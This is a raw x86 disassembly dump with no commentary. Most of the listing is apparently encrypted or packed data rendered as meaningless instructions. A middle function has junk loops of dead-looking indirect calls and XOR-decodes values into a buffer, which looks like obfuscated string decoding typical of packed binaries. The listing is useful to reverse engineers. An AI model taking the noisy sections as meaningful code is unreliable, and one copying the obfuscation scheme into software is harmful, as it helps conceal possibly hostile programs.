  415fb0:	xchg   ebp,eax
  415fb1:	retf   0x3e7
  415fb4:	jne    0x415faf
  415fb6:	dec    edi
  415fb7:	pop    ss
  415fb8:	push   esi
  415fb9:	pushf  
  415fba:	pop    ss
  415fbb:	ja     0x415f94
  415fbd:	fnstsw WORD PTR [esi]
  415fbf:	out    dx,eax
  415fc0:	fcomp  QWORD PTR [ebx-0x421fa62a]
  415fc6:	outs   dx,DWORD PTR cs:[esi]
  415fc8:	mov    ebp,0xf7c7fa52
  415fcd:	mov    es,ebp
  415fcf:	sub    al,0x72
  415fd1:	xchg   edx,eax
  415fd2:	push   esi
  415fd3:	and    BYTE PTR [esi-0x664a476],dh
  415fd9:	add    al,0x12
  415fdb:	xchg   esp,eax
  415fdc:	aas    
  415fdd:	aad    0xf4
  415fdf:	pop    ebp
  415fe0:	mov    ah,BYTE PTR [eax-0x54]
  415fe3:	repnz scas al,BYTE PTR es:[edi]
  415fe5:	loop   0x416018
  415fe7:	or     edx,0x553040a8
  415fed:	sbb    BYTE PTR [edx],al
  415fef:	pop    ecx
  415ff0:	ins    BYTE PTR es:[edi],dx
  415ff1:	loope  0x416065
  415ff3:	pop    edi
  415ff4:	jae    0x415fda
  415ff6:	div    BYTE PTR ds:0x14336d4
  415ffc:	xor    DWORD PTR [ecx+0x51],ebp
  415fff:	dec    ebx
  416000:	aaa    
  416001:	test   DWORD PTR [ebp+0x6a7f7070],edx
  416007:	push   esi
  416008:	mov    esp,DWORD PTR [edi-0x7e]
  41600b:	push   esi
  41600c:	int3   
  41600d:	dec    edi
  41600e:	push   ebx
  41600f:	inc    eax
  416010:	pop    esp
  416011:	das    
  416012:	xor    dl,BYTE PTR [ecx]
  416014:	lahf   
  416015:	xchg   edx,eax
  416016:	daa    
  416017:	ins    BYTE PTR es:[edi],dx
  416018:	ror    edi,1
  41601a:	(bad)  [eax+0xbf04c1d]
  416020:	xor    DWORD PTR [eax],ebp
  416022:	fild   DWORD PTR [ebx]
  416024:	popa   
  416025:	xchg   DWORD PTR ds:0xf2c4b87e,ebx
  41602b:	push   0xffffffce
  41602d:	jg     0x41601e
  41602f:	jge    0x41604b
  416031:	cdq    
  416032:	das    
  416033:	xchg   ebp,ecx
  416035:	call   0xbeb34480
  41603a:	xchg   ebp,eax
  41603b:	and    al,BYTE PTR [esi+0x1c0eb835]
  416041:	addr16 xor eax,0xb863e8e4
  416047:	jge    0x416073
  416049:	std    
  41604a:	repnz call 0xeec6:0xe60f44d1
  416052:	aam    0xf0
  416054:	test   al,0x83
  416056:	nop
  416057:	adc    al,0xa4
  416059:	pmaxub mm3,QWORD PTR [esi-0x46287344]
  416060:	push   0xffffff99
  416062:	sub    dh,BYTE PTR [eax]
  416064:	repnz inc edx
  416066:	icebp  
  416067:	jno    0x416046
  416069:	retf   0x4e82
  41606c:	xor    dh,al
  41606e:	scas   al,BYTE PTR es:[edi]
  41606f:	xor    DWORD PTR [edx+edi*2],eax
  416072:	lock fisttp QWORD PTR [eax-0x8332b0]
  416079:	sar    BYTE PTR es:[ebp+0x2c],1
  41607d:	adc    eax,0xcefea670
  416082:	mov    cl,0xca
  416084:	xor    eax,esp
  416086:	rol    BYTE PTR [ecx-0x1],cl
  416089:	add    dl,BYTE PTR [ecx+0xd]
  41608c:	inc    esi
  41608d:	push   ebp
  41608e:	xchg   bx,ax
  416090:	and    al,0x6c
  416092:	stos   BYTE PTR es:[edi],al
  416093:	adc    BYTE PTR [eax],ch
  416095:	cmp    DWORD PTR [esi],edi
  416097:	das    
  416098:	popf   
  416099:	pop    ebx
  41609a:	fmul   DWORD PTR [eax]
  41609c:	or     esp,DWORD PTR [edx+edx*2-0x7b893a03]
  4160a3:	sub    BYTE PTR [ebx-0x1f],ah
  4160a6:	xchg   ecx,eax
  4160a7:	mov    eax,ds:0xb7c6de7a
  4160ac:	xor    cl,BYTE PTR [eax]
  4160ae:	in     al,dx
  4160af:	push   0xffffffd3
  4160b1:	mov    edx,0x78c7cdd4
  4160b6:	jge    0x416056
  4160b8:	pop    eax
  4160b9:	addr16 aas 
  4160bb:	jmp    0x9d3beb3b
  4160c0:	inc    eax
  4160c1:	mov    esi,0xa84fbd99
  4160c6:	sub    eax,0x4fa539b5
  4160cb:	sub    BYTE PTR [ebp-0x4a],ah
  4160ce:	mov    esi,0xfb6b0424
  4160d3:	out    0xcf,al
  4160d5:	mov    ebp,0x960f58b7
  4160da:	stos   DWORD PTR es:[edi],eax
  4160db:	jno    0x416086
  4160dd:	add    al,al
  4160df:	out    dx,eax
  4160e0:	mov    ah,0xdd
  4160e2:	mov    bl,0xbb
  4160e4:	sti    
  4160e5:	add    bh,BYTE PTR [eax+0x44]
  4160e8:	push   ss
  4160e9:	add    edx,DWORD PTR [edx+edi*4+0x14f946a7]
  4160f0:	ret    
  4160f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4160f2:	fisttp WORD PTR [edx]
  4160f4:	push   ds
  4160f5:	icebp  
  4160f6:	mov    DWORD PTR [esi+eax*1],ebx
  4160f9:	adc    cl,bl
  4160fb:	popa   
  4160fc:	sub    ebp,DWORD PTR [eax-0xec51042]
  416102:	push   ebx
  416103:	out    0xfc,eax
  416105:	fldenv ds:0x44f3fdc8
  41610b:	out    0x4,al
  41610d:	adc    DWORD PTR [edx-0x2a],edx
  416110:	sbb    ecx,ecx
  416112:	std    
  416113:	mov    DWORD PTR [esi+0x11a63f83],edi
  416119:	sahf   
  41611a:	cwde   
  41611b:	sub    al,0x98
  41611d:	cmp    DWORD PTR [ecx],eax
  41611f:	lea    ebx,[edi-0x79d5d789]
  416125:	outs   dx,BYTE PTR ds:[esi]
  416126:	fisubr DWORD PTR [edx-0xa]
  416129:	jge    0x4161a4
  41612b:	addr16 ret 
  41612d:	fnsave [ebp+0x39]
  416130:	outs   dx,BYTE PTR ds:[esi]
  416131:	fcom   DWORD PTR [eax+0x3e7af26c]
  416137:	call   0xfaac989d
  41613c:	aas    
  41613d:	cmp    al,BYTE PTR [edx+0x8]
  416140:	add    ebx,ebx
  416142:	push   esp
  416143:	fwait
  416144:	push   esp
  416145:	loopne 0x416174
  416147:	lods   eax,DWORD PTR ds:[esi]
  416148:	add    BYTE PTR [edi-0x18814ab7],ah
  41614e:	out    dx,al
  41614f:	comiss xmm1,xmm4
  416152:	push   cs
  416153:	cli    
  416154:	fsub   st(2),st
  416156:	lock xor DWORD PTR [edi],edx
  416159:	daa    
  41615a:	test   eax,0xf2ccafa8
  41615f:	jl     0x4161a7
  416161:	inc    eax
  416162:	push   ss
  416163:	retf   
  416164:	xchg   edi,eax
  416165:	xor    bl,BYTE PTR [esi]
  416167:	lods   eax,DWORD PTR ds:[esi]
  416168:	and    eax,0x4ff6da55
  41616d:	xchg   edi,eax
  41616e:	jnp    0x4161a5
  416170:	pusha  
  416171:	stos   BYTE PTR es:[edi],al
  416172:	jae    0x416134
  416174:	push   ebp
  416175:	fcomip st,st(5)
  416177:	jge    0x416164
  416179:	clc    
  41617a:	or     eax,0x99590e85
  41617f:	xor    eax,0x5d8e9ad1
  416184:	movnti DWORD PTR [edx+0x16],ebx
  416188:	call   0x42714201
  41618d:	outs   dx,BYTE PTR ds:[esi]
  41618e:	or     al,0xe4
  416190:	adc    ch,ch
  416192:	(bad)  
  416193:	(bad)  
  416195:	push   esi
  416196:	in     eax,dx
  416197:	enter  0xad5b,0x17
  41619b:	je     0x4161c1
  41619d:	lds    esi,FWORD PTR [edx]
  41619f:	push   ebx
  4161a0:	stos   BYTE PTR es:[edi],al
  4161a1:	xchg   BYTE PTR [eax],dl
  4161a3:	fimul  DWORD PTR [esi-0x5dc6b5bc]
  4161a9:	push   ds
  4161aa:	dec    edi
  4161ab:	test   eax,0x1a065df0
  4161b0:	adc    eax,0xbcfb1095
  4161b5:	retf   
  4161b6:	jp     0x4161e6
  4161b8:	inc    edx
  4161b9:	or     ebp,esp
  4161bb:	adc    ah,dl
  4161bd:	add    bh,0x95
  4161c0:	or     dl,BYTE PTR [ebx-0x2a226e43]
  4161c6:	ds (bad) 
  4161c8:	jmp    0xcafa:0x9c19b87a
  4161cf:	pop    es
  4161d0:	pop    ss
  4161d1:	mov    ebx,0x85a4e5e4
  4161d6:	dec    edx
  4161d7:	adc    DWORD PTR [edi+0xf],esi
  4161da:	or     WORD PTR [eax-0x55],cx
  4161de:	shl    BYTE PTR [esi-0xd],0x13
  4161e2:	or     ah,BYTE PTR [eax+0x61]
  4161e5:	and    BYTE PTR ds:0x102ef005,0x55
  4161ec:	xchg   esi,eax
  4161ed:	aad    0x5a
  4161ef:	add    eax,ebx
  4161f1:	adc    eax,0xf5d578ae
  4161f6:	adc    al,0x47
  4161f8:	scas   eax,DWORD PTR es:[edi]
  4161f9:	push   es
  4161fa:	fnstenv [bp-0x37]
  4161fe:	sahf   
  4161ff:	add    DWORD PTR [eax+0x10f30b04],edi
  416205:	mov    dh,0x80
  416207:	stc    
  416208:	jg     0x4161e0
  41620a:	jecxz  0x4161a6
  41620c:	inc    esi
  41620d:	push   0x4f
  41620f:	jg     0x41628c
  416211:	es repnz xchg edi,eax
  416214:	dec    ecx
  416215:	push   eax
  416216:	adc    dh,BYTE PTR [ecx+0x5ac5b82e]
  41621c:	pusha  
  41621d:	lods   eax,DWORD PTR ds:[esi]
  41621e:	(bad)
  416221:	or     BYTE PTR [ecx+0x9],0xff
  416225:	pop    esi
  416226:	leave  
  416227:	ret    0x18
  41622a:	push   ebp
  41622b:	mov    ebp,esp
  41622d:	sub    esp,0x9c
  416233:	or     ecx,eax
  416235:	mov    ecx,DWORD PTR [ebp+0x8]
  416238:	adc    DWORD PTR ds:0x42a29e,0x5466
  416242:	mov    eax,0x8a98
  416247:	xor    ax,WORD PTR [ecx+0x20]
  41624b:	and    DWORD PTR ds:0x42a2d6,0x0
  416255:	jmp    0x416267
  41625a:	mov    ecx,DWORD PTR ds:0x42a2d6
  416260:	inc    ecx
  416261:	mov    DWORD PTR ds:0x42a2d6,ecx
  416267:	cmp    DWORD PTR ds:0x42a2d6,0x12
  41626e:	jae    0x4162bb
  416274:	cmp    DWORD PTR ds:0x42a2d6,0xa
  41627b:	jle    0x4162bb
  416281:	jmp    0x41629c
  416286:	push   0x5de0
  41628b:	push   0x42a26a
  416290:	push   DWORD PTR [ebp-0x28]
  416293:	push   DWORD PTR [ebp-0x10]
  416296:	call   DWORD PTR ds:0x42a3d2
  41629c:	cmp    DWORD PTR ds:0x42a2d6,0x9
  4162a3:	jne    0x4162b6
  4162a9:	mov    ecx,DWORD PTR ds:0x42a2d6
  4162af:	inc    ecx
  4162b0:	mov    DWORD PTR ds:0x42a2d6,ecx
  4162b6:	jmp    0x41625a
  4162bb:	mov    ecx,0x3b5a
  4162c0:	add    DWORD PTR ds:0x42a292,0x71f8
  4162ca:	add    ax,cx
  4162cd:	sbb    ecx,DWORD PTR ds:0x42a2d6
  4162d3:	movzx  eax,ax
  4162d6:	sbb    ecx,DWORD PTR ds:0x42a29a
  4162dc:	mov    DWORD PTR [ebp-0x10],eax
  4162df:	mov    BYTE PTR [ebp-0x1],0x7c
  4162e3:	and    DWORD PTR ds:0x42a2a2,ecx
  4162e9:	lea    eax,[ebp-0x1]
  4162ec:	mov    DWORD PTR [ebp-0xc],eax
  4162ef:	and    DWORD PTR ds:0x42a2be,0x0
  4162f9:	mov    ecx,DWORD PTR ds:0x42a2be
  4162ff:	inc    ecx
  416300:	mov    DWORD PTR ds:0x42a2be,ecx
  416306:	cmp    DWORD PTR ds:0x42a2be,0x25
  41630d:	jg     0x416346
  416313:	jmp    0x416339
  416318:	push   DWORD PTR [ebp-0x28]
  41631b:	push   0x5043
  416320:	push   DWORD PTR [ebp-0x18]
  416323:	push   DWORD PTR [ebp-0xc]
  416326:	push   DWORD PTR [ebp-0x1c]
  416329:	push   0x5d36
  41632e:	push   0x429153
  416333:	call   DWORD PTR ds:0x42a3d6
  416339:	cmp    DWORD PTR ds:0x42a2be,0x1a
  416340:	jb     0x4162f9
  416346:	mov    al,BYTE PTR [ebp-0x1]
  416349:	and    DWORD PTR ds:0x42a26e,0x0
  416353:	mov    ecx,DWORD PTR ds:0x42a26e
  416359:	inc    ecx
  41635a:	mov    DWORD PTR ds:0x42a26e,ecx
  416360:	cmp    DWORD PTR ds:0x42a26e,0x19
  416367:	jge    0x416385
  41636d:	jmp    0x416378
  416372:	call   DWORD PTR ds:0x42a3da
  416378:	cmp    DWORD PTR ds:0x42a26e,0x10
  41637f:	jb     0x416353
  416385:	mov    ecx,DWORD PTR [ebp-0xc]
  416388:	xor    al,0x7c
  41638a:	mov    DWORD PTR ds:0x42a2c6,0x2666
  416394:	inc    al
  416396:	and    DWORD PTR ds:0x42a2ce,0x42a28a
  4163a0:	mov    BYTE PTR [ecx],al
  4163a2:	sbb    DWORD PTR ds:0x42a2f6,0x5717
  4163ac:	mov    DWORD PTR [ebp-0x18],0xf89c85a5
  4163b3:	push   ebx
  4163b4:	mov    DWORD PTR [ebp-0x8],0xf89c85ba
  4163bb:	mov    DWORD PTR ds:0x42a2f6,0x16
  4163c5:	cmp    DWORD PTR ds:0x42a2f6,0x0
  4163cc:	je     0x41640c
  4163d2:	cmp    DWORD PTR ds:0x42a2f6,0x1e
  4163d9:	jb     0x41640c
  4163df:	jmp    0x4163fc
  4163e4:	push   0x8db9
  4163e9:	push   DWORD PTR [ebp-0x1c]
  4163ec:	push   0x6bac
  4163f1:	push   0x6e74
  4163f6:	call   DWORD PTR ds:0x42a3de
  4163fc:	mov    eax,ds:0x42a2f6
  416401:	dec    eax
  416402:	mov    ds:0x42a2f6,eax
  416407:	jmp    0x4163c5
  41640c:	mov    ecx,DWORD PTR [ebp-0x18]
  41640f:	push   esi
  416410:	or     DWORD PTR ds:0x42a286,0x93e
  41641a:	mov    eax,0x75108aa
  41641f:	and    DWORD PTR ds:0x42a2e2,0x0
  416429:	jmp    0x41643d
  41642e:	xor    esi,esi
  416430:	add    esi,DWORD PTR ds:0x42a2e2
  416436:	inc    esi
  416437:	mov    DWORD PTR ds:0x42a2e2,esi
  41643d:	cmp    DWORD PTR ds:0x42a2e2,0x17
  416444:	jae    0x416481
  41644a:	cmp    DWORD PTR ds:0x42a2e2,0xa
  416451:	jl     0x416481
  416457:	jmp    0x416462
  41645c:	call   DWORD PTR ds:0x42a3e2
  416462:	cmp    DWORD PTR ds:0x42a2e2,0x9
  416469:	jne    0x41647c
  41646f:	mov    esi,DWORD PTR ds:0x42a2e2
  416475:	inc    esi
  416476:	mov    DWORD PTR ds:0x42a2e2,esi
  41647c:	jmp    0x41642e
  416481:	xor    ecx,eax
  416483:	mov    esi,DWORD PTR ds:0x42a2ae
  416489:	sbb    esi,DWORD PTR ds:0x42a25a
  41648f:	mov    DWORD PTR ds:0x42a2ae,esi
  416495:	mov    esi,0x3272f1
  41649a:	push   edi
  41649b:	add    ecx,esi
  41649d:	jmp    0x4164b3
  4164a2:	inc    DWORD PTR ds:0x42a26e
  4164a8:	mov    dl,BYTE PTR [ebp-0x1]
  4164ab:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  4164b2:	inc    ecx
  4164b3:	mov    DWORD PTR ds:0x42a286,0x7bd4
  4164bd:	cmp    ecx,0x40
  4164c0:	jb     0x4164a2
  4164c6:	not    edx
  4164c8:	mov    edx,DWORD PTR [ebp-0x18]
  4164cb:	xor    edx,eax
  4164cd:	mov    DWORD PTR ds:0x42a302,0x3db0
  4164d7:	add    edx,esi
  4164d9:	jmp    0x416628
  4164de:	movzx  edi,WORD PTR ds:0x42a296
  4164e5:	or     DWORD PTR ds:0x42a262,edi
  4164eb:	mov    edi,DWORD PTR [ebp+0x8]
  4164ee:	adc    DWORD PTR ds:0x42a286,edx
  4164f4:	mov    ecx,0x8a98
  4164f9:	adc    DWORD PTR ds:0x42a2fe,0x3816
  416503:	xor    cx,WORD PTR [edi+edx*4+0x2]
  416508:	and    DWORD PTR ds:0x42a2ae,0x0
  416512:	jmp    0x416524
  416517:	mov    edi,DWORD PTR ds:0x42a2ae
  41651d:	inc    edi
  41651e:	mov    DWORD PTR ds:0x42a2ae,edi
  416524:	cmp    DWORD PTR ds:0x42a2ae,0x1f
  41652b:	jae    0x41657e
  416531:	cmp    DWORD PTR ds:0x42a2ae,0xa
  416538:	jbe    0x41657e
  41653e:	jmp    0x41655d
  416543:	push   0x42a25e
  416548:	push   0x6fb7
  41654d:	push   0x429009
  416552:	push   0x4290e8
  416557:	call   DWORD PTR ds:0x42a3ea
  41655d:	cmp    DWORD PTR ds:0x42a2ae,0x9
  416564:	jne    0x416579
  41656a:	xor    edi,edi
  41656c:	xor    edi,DWORD PTR ds:0x42a2ae
  416572:	inc    edi
  416573:	mov    DWORD PTR ds:0x42a2ae,edi
  416579:	jmp    0x416517
  41657e:	mov    edi,0x3b5a
  416583:	add    DWORD PTR ds:0x42a2fa,0x42a2c2
  41658d:	add    cx,di
  416590:	sbb    DWORD PTR ds:0x42a256,0x16d8
  41659a:	movzx  ecx,cx
  41659d:	and    DWORD PTR ds:0x42a2a2,0x42a29a
  4165a7:	mov    DWORD PTR [ebp-0xc],ecx
  4165aa:	and    DWORD PTR ds:0x42a26e,0x0
  4165b4:	xor    ecx,ecx
  4165b6:	xor    ecx,DWORD PTR ds:0x42a26e
  4165bc:	inc    ecx
  4165bd:	mov    DWORD PTR ds:0x42a26e,ecx
  4165c3:	cmp    DWORD PTR ds:0x42a26e,0x19
  4165ca:	jle    0x4165f5
  4165d0:	jmp    0x4165e8
  4165d5:	push   0x594c
  4165da:	push   0x42a276
  4165df:	push   DWORD PTR [ebp-0x1c]
  4165e2:	call   DWORD PTR ds:0x42a3ee
  4165e8:	cmp    DWORD PTR ds:0x42a26e,0x17
  4165ef:	jb     0x4165b4
  4165f5:	mov    ecx,DWORD PTR [ebp+0x8]
  4165f8:	mov    DWORD PTR ds:0x42a29a,0x62ed
  416602:	movzx  ecx,WORD PTR [ecx+edx*4]
  416606:	xor    ecx,0x8a98
  41660c:	add    ecx,edi
  41660e:	mov    DWORD PTR ds:0x42a302,0x1620
  416618:	mov    edi,DWORD PTR [ebp-0xc]
  41661b:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  416622:	mov    ecx,0x8de
  416627:	inc    edx
  416628:	mov    ecx,DWORD PTR [ebp-0x10]
  41662b:	mov    DWORD PTR ds:0x42a25a,0x2d30
  416635:	cmp    edx,ecx
  416637:	jne    0x4164de
  41663d:	and    edx,edx
  41663f:	mov    ecx,DWORD PTR [ebp-0x18]
  416642:	sub    edi,DWORD PTR ds:0x42a25a
  416648:	mov    edx,DWORD PTR [ebp+0x10]
  41664b:	xor    DWORD PTR ds:0x42a2ca,0xf9d
  416655:	xor    ecx,eax
  416657:	and    DWORD PTR ds:0x42a2c2,ebx
  41665d:	add    ecx,esi
  41665f:	mov    DWORD PTR [edx],ecx
  416661:	mov    ecx,DWORD PTR [ebp-0x18]
  416664:	sbb    DWORD PTR ds:0x42a2aa,0x1e81
  41666e:	jmp    0x4189c6
  416673:	mov    dl,0x1f
  416675:	xlat   BYTE PTR ds:[ebx]
  416676:	and    edx,edx
  416678:	mov    eax,ds:0xbec98882
  41667d:	js     0x4166c3
  41667f:	es pop ecx
  416681:	or     ebx,0x837c41fc
  416687:	inc    esi
  416688:	pop    esi
  416689:	add    DWORD PTR [ebx+0x78c201d3],0x2
  416690:	xchg   ebp,eax
  416691:	xor    al,0x61
  416693:	pop    ebp
  416694:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416695:	mov    al,ss:0x77980c89
  41669b:	push   ss
  41669c:	mov    ebx,0x77136b07
  4166a1:	and    esp,DWORD PTR [esi+eax*2+0x1b50b7b4]
  4166a8:	xor    DWORD PTR [edx],esp
  4166aa:	jmp    0x7731:0x78b4653a
  4166b1:	ss mov esi,0xe5298095
  4166b7:	pushfw 
  4166b9:	jo     0x4166a4
  4166bb:	dec    ecx
  4166bc:	retf   
  4166bd:	in     eax,dx
  4166be:	cmp    DWORD PTR es:[ebx+edi*4],eax
  4166c2:	jbe    0x416718
  4166c4:	push   edx
  4166c5:	aam    0x74
  4166c7:	scas   al,BYTE PTR es:[edi]
  4166c8:	and    DWORD PTR [eax+esi*4],ebp
  4166cb:	enter  0xb2ca,0x11
  4166cf:	shl    DWORD PTR [ebp-0x3c],1
  4166d2:	pop    esi
  4166d3:	aad    0x5a
  4166d5:	(bad)  
  4166d6:	fisubr WORD PTR [eax+0x344a597]
  4166dc:	sub    DWORD PTR [edx-0x49],0x7c
  4166e0:	cwde   
  4166e1:	push   ebx
  4166e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4166e3:	ja     0x416688
  4166e5:	mov    ecx,0x9d6b955d
  4166ea:	retf   
  4166eb:	mov    dh,0x91
  4166ed:	icebp  
  4166ee:	ja     0x4166de
  4166f0:	popa   
  4166f1:	cmp    al,0x3f
  4166f3:	push   esi
  4166f4:	mov    cl,0x3a
  4166f6:	hlt    
  4166f7:	test   dl,0x57
  4166fa:	push   edx
  4166fb:	cmc    
  4166fc:	xor    DWORD PTR [eax+0xe880d75],ecx
  416702:	sbb    ch,0xed
  416705:	(bad)  
  416706:	jmp    0x41673d
  416708:	adc    BYTE PTR [eax-0x66],dl
  41670b:	push   0x864a34f8
  416710:	lods   eax,DWORD PTR ds:[esi]
  416711:	inc    ecx
  416712:	pop    es
  416713:	test   DWORD PTR [edi],0x45a28574
  416719:	inc    ebx
  41671a:	push   ebx
  41671b:	mov    al,cs:0xdbee97a9
  416721:	imul   ecx,DWORD PTR [eax+0x54],0x4d
  416725:	repnz inc ebx
  416727:	xor    eax,0x6c5f198b
  41672c:	push   ebx
  41672d:	sbb    BYTE PTR [eax-0x67],bl
  416730:	jle    0x416738
  416732:	fistp  QWORD PTR [ebp-0x3282a3c9]
  416738:	push   esi
  416739:	out    dx,al
  41673a:	(bad)  [esi-0x369583b9]
  416740:	hlt    
  416741:	adc    BYTE PTR [edx],ch
  416743:	cwde   
  416744:	popf   
  416745:	sub    eax,0x8050d077
  41674a:	inc    ebp
  41674b:	cmp    BYTE PTR [ecx-0x69659a16],ah
  416751:	mov    dl,0x2e
  416753:	pusha  
  416754:	dec    ebp
  416755:	test   al,0x44
  416757:	lea    edi,[esi+ecx*8]
  41675a:	aas    
  41675b:	enter  0xa4f2,0xa6
  41675f:	adc    eax,0xb1a1e971
  416764:	push   ss
  416765:	cli    
  416766:	(bad)  
  416767:	lods   al,BYTE PTR ds:[esi]
  416768:	push   ebp
  416769:	fist   DWORD PTR [edi+ebp*1-0x38dc3211]
  416770:	int3   
  416771:	mov    BYTE PTR [ebx+0x30],dh
  416774:	popf   
  416775:	call   0xe5312c78
  41677a:	sbb    BYTE PTR [ebx+edx*2],cl
  41677d:	(bad)  
  41677e:	push   cs
  41677f:	aaa    
  416780:	call   0xf2c8:0xffc60892
  416787:	and    ch,BYTE PTR [esi-0x1f9ab2b]
  41678d:	jge    0x416728
  41678f:	js     0x4167d6
  416791:	test   ebp,edi
  416793:	xor    ch,cl
  416795:	pop    eax
  416796:	push   eax
  416797:	scas   al,BYTE PTR es:[edi]
  416798:	lock jg 0x41675c
  41679b:	fist   WORD PTR [esi+eiz*2-0x47]
  41679f:	xor    DWORD PTR [edi-0x15],edi
  4167a2:	pop    es
  4167a3:	cmc    
  4167a4:	jne    0x41681a
  4167a6:	outs   dx,DWORD PTR ds:[esi]
  4167a7:	(bad)  
  4167a8:	lods   eax,DWORD PTR ds:[esi]
  4167a9:	nop
  4167aa:	int    0xe8
  4167ac:	mov    BYTE PTR [ebp+0x1969b7bd],0xe1
  4167b3:	repz jg 0x4167fb
  4167b6:	in     al,0xc3
  4167b8:	jmp    0xd48:0x6cebe39e
  4167bf:	ins    DWORD PTR es:[edi],dx
  4167c0:	loop   0x416834
  4167c2:	cmp    al,0xea
  4167c4:	mov    esi,0x847f8b6f
  4167c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4167ca:	and    al,0xa
  4167cc:	cwde   
  4167cd:	mov    ds:0x18121a24,eax
  4167d2:	add    BYTE PTR [edi],ch
  4167d4:	ret    0x69ad
  4167d7:	jmp    0x416784
  4167d9:	fwait
  4167da:	sub    eax,0x883eba47
  4167df:	jg     0x416792
  4167e1:	and    al,0xc1
  4167e3:	pop    ebx
  4167e4:	push   0xffffffc4
  4167e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4167e7:	retf   
  4167e8:	imul   ecx,DWORD PTR [eax+0x570e5ddc],0xfffffff1
  4167ef:	and    eax,0xef5f0c54
  4167f4:	(bad)  
  4167f6:	fcom   QWORD PTR [edx-0x28a433f5]
  4167fc:	mov    dl,0x9d
  4167fe:	es xor bl,dh
  416801:	pop    esp
  416802:	mov    ds:0x5bd64c72,eax
  416807:	in     al,dx
  416808:	mov    bh,0x87
  41680a:	rcl    DWORD PTR ds:0xaf430161,1
  416810:	dec    ebp
  416811:	pop    eax
  416812:	push   edx
  416813:	loope  0x416825
  416815:	push   esp
  416816:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416817:	adc    BYTE PTR [ebp-0x4ca066f3],bh
  41681d:	push   0x8abdd7d7
  416822:	cmp    edi,DWORD PTR [esp+eax*4-0x7315321b]
  416829:	jae    0x4167d3
  41682b:	or     cl,dl
  41682d:	in     eax,0xa7
  41682f:	rol    BYTE PTR [ebx],1
  416831:	cmp    DWORD PTR [edx-0x104091db],ebx
  416837:	sub    bl,dh
  416839:	in     al,dx
  41683a:	xchg   ebx,eax
  41683b:	jb     0x41684f
  41683d:	push   esp
  41683e:	out    0xed,eax
  416840:	cmp    DWORD PTR [esi-0x7d],edx
  416843:	rol    BYTE PTR [esp+eax*8],0x62
  416847:	call   0x5745:0x4fabfd52
  41684e:	call   0x4e5e61e
  416853:	(bad)  
  416854:	in     al,dx
  416855:	out    0x9b,eax
  416857:	ficomp DWORD PTR [ebp+esi*2+0x9a3bdd7]
  41685e:	rcl    esi,1
  416860:	imul   ebx,DWORD PTR [edx+ecx*1-0x6a478825],0x80d17ebc
  41686b:	sbb    dh,BYTE PTR [edi-0x75]
  41686e:	loop   0x416826
  416870:	mov    esp,0xe7fb82f
  416875:	jae    0x4168c2
  416877:	and    eax,0xe024a96b
  41687c:	mov    ah,0x58
  41687e:	push   0x2d
  416880:	retf   
  416881:	dec    edx
  416882:	(bad)  
  416883:	mov    al,0x30
  416885:	fbld   TBYTE PTR [esi]
  416887:	sub    DWORD PTR [ecx+0x22],edi
  41688a:	sahf   
  41688b:	stos   BYTE PTR es:[edi],al
  41688c:	cmp    ebp,DWORD PTR ds:0x4f691f4
  416892:	jne    0x41683f
  416894:	inc    esi
  416895:	mov    ebp,0x4fbf3de0
  41689a:	mov    ds:0x7c7faa28,eax
  41689f:	lds    edi,FWORD PTR [ecx]
  4168a1:	lods   eax,DWORD PTR ds:[esi]
  4168a2:	out    dx,al
  4168a3:	sbb    esi,edi
  4168a5:	push   cs
  4168a6:	fdivr  DWORD PTR [edx+0x22b910fb]
  4168ac:	mov    ss,eax
  4168ae:	add    al,0xb3
  4168b0:	call   DWORD PTR [edi+0x34f76e22]
  4168b6:	mov    ds:0x4f3e2aad,eax
  4168bb:	mov    dl,0xc6
  4168bd:	jnp    0x416876
  4168bf:	mov    fs,edi
  4168c1:	push   ss
  4168c2:	jne    0x416879
  4168c4:	or     DWORD PTR [ebp+0x14],0x2e
  4168c8:	mov    ah,BYTE PTR ds:0xef4c57bb
  4168ce:	ret    0x7fb
  4168d1:	ds in  eax,dx
  4168d3:	lahf   
  4168d4:	sar    DWORD PTR [ebp+0x57e1356b],1
  4168da:	inc    ebp
  4168db:	push   ebx
  4168dc:	xor    al,BYTE PTR ds:0xdb10e372
  4168e2:	enter  0xc181,0x9b
  4168e6:	imul   edx,ebp,0x1c85163
  4168ec:	and    ebp,DWORD PTR [ebx+0x6b6898fb]
  4168f2:	stos   DWORD PTR es:[edi],eax
  4168f3:	push   ebx
  4168f4:	pop    edx
  4168f5:	imul   esp,DWORD PTR [edx-0x754eabdd]
  4168fc:	mov    WORD PTR [ebx],gs
  4168fe:	fmul   QWORD PTR [ebp+0x4485247c]
  416904:	or     eax,DWORD PTR [eax-0x68]
  416907:	fcmovbe st,st(4)
  416909:	imul   ebp,DWORD PTR [ebx+eiz*2],0x2d
  41690d:	add    BYTE PTR [edx+edx*1-0x6e],0x47
  416912:	repz shl BYTE PTR [eax-0x30ef6d90],1
  416919:	fs add al,0xf6
  41691c:	lsl    eax,WORD PTR [ecx]
  41691f:	inc    edx
  416920:	cmp    esi,DWORD PTR [esi-0x44e836a5]
  416926:	push   es
  416927:	rcl    DWORD PTR [eax+0xcfd0db8],cl
  41692d:	pusha  
  41692e:	xor    al,0x16
  416930:	cmp    BYTE PTR [ebp+0x46],bl
  416933:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416934:	mov    eax,0x78d06a32
  416939:	stos   DWORD PTR es:[edi],eax
  41693a:	sahf   
  41693b:	shl    BYTE PTR [eax-0x404c1a17],1
  416941:	nop
  416942:	or     eax,0xba39ac2
  416947:	fild   WORD PTR [ebp+0x46eab9f4]
  41694d:	mov    WORD PTR [esi],es
  41694f:	jo     0x41697a
  416951:	(bad)  
  416952:	hlt    
  416953:	repz pop ebx
  416955:	mul    BYTE PTR [edi-0xe]
  416958:	mov    ebx,0x5dc84803
  41695d:	cmp    ebp,DWORD PTR [edx]
  41695f:	dec    ecx
  416960:	add    eax,0x169189a2
  416965:	je     0x4169df
  416967:	inc    ebp
  416968:	test   DWORD PTR [edx-0x76c9e456],ebp
  41696e:	(bad)  
  41696f:	bound  eax,QWORD PTR [edi]
  416971:	test   al,0x3e
